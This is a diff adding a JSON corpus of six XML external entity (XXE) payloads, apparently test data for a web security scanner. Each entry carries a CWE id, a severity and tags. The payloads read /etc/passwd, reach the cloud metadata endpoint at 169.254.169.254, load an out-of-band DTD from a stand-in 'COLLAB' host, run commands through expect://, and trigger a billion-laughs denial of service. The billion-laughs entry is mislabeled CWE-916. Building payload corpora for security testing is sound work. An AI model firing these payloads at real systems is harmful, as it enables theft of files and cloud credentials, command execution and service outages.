@@ -1,0 +1,14 @@
+{
+  "schema": "12-schemas/payload.schema.json",
+  "corpus_id": "PL-WEB-XXE",
+  "version": "1.0.0",
+  "provenance": { "source": "PAT", "ref": "master@2026-01-15" },
+  "payloads": [
+    { "payload_id": "PL-WEB-XXE-0001", "cwe_id": "CWE-611", "context": "xml", "surface": "body", "engine": "none", "payload": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>", "severity": "high", "tags": ["file-read", "classic"], "classification": "T1" },
+    { "payload_id": "PL-WEB-XXE-0002", "cwe_id": "CWE-611", "context": "xml", "surface": "body", "engine": "none", "payload": "<!DOCTYPE r [<!ENTITY x SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><r>&x;</r>", "severity": "critical", "tags": ["ssrf", "cloud-metadata"], "classification": "T1" },
+    { "payload_id": "PL-WEB-XXE-0003", "cwe_id": "CWE-611", "context": "xml", "surface": "body", "engine": "none", "payload": "<!DOCTYPE r [<!ENTITY % d SYSTEM \"http://COLLAB/evil.dtd\">%d;]><r/>", "severity": "high", "tags": ["parameter-entity", "oob"], "classification": "T2" },
+    { "payload_id": "PL-WEB-XXE-0004", "cwe_id": "CWE-611", "context": "xml", "surface": "body", "engine": "none", "payload": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"expect://id\">]><r>&x;</r>", "severity": "high", "tags": ["expect-protocol", "blind"], "classification": "T2" },
+    { "payload_id": "PL-WEB-XXE-0005", "cwe_id": "CWE-611", "context": "xml", "surface": "body", "engine": "none", "payload": "<!DOCTYPE r [<!ENTITY x SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><r>&x;</r>", "severity": "high", "tags": ["php-filter", "file-read"], "classification": "T1" },
+    { "payload_id": "PL-WEB-XXE-0006", "cwe_id": "CWE-916", "context": "xml", "surface": "body", "engine": "none", "payload": "<!DOCTYPE r [<!ENTITY a \"aaaa\"><!ENTITY b \"&a;&a;&a;&a;&a;\">]><r>&b;</r>", "severity": "medium", "tags": ["billion-laughs", "dos"], "classification": "T2" }
+  ]
+}
